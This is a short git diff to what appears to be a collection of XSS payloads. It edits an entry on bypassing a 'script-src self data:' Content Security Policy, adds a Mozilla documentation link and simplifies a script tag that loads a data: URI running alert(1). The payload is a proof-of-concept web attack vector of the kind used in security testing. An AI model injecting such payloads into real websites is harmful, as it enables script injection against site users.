@@ -1072,10 +1072,10 @@ Works for CSP like `script-src self`
 
 ### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)
 
-Works for CSP like `script-src 'self' data:`
+Works for CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).
 
 ```javascript
-<script ?/src="data:+,\u0061lert%281%29">/</script>
+<script src="data:,alert(1)">/</script>
 ```
 
 
